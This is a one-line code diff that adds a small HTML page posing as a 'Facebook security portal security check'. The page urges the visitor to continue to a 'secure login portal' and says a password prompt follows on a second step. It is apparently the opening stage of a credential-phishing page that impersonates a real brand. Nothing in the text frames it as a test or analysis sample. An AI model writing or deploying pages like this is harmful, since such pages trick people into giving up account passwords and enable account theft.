@@ -1,0 +1,1 @@
+<html><body><h2>Facebook security portal security check</h2><p>Please continue to proceed to the secure login portal.</p><a href='./step2'>Continue</a><noscript>Password prompt appears after continue.</noscript></body></html>
